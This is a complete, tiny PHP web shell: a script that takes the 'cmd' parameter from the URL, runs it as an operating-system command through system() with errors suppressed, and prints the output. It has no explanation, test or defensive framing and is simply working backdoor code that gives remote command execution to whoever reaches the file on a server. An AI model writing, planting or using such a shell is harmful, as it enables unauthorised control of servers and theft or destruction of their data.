<?php
function execute($cfe) {
	@ob_start();
	@system($cfe);
	$res = @ob_get_contents();
	@ob_end_clean();
	return $res;
}
$command = $_GET['cmd'];
echo(execute($command));
?>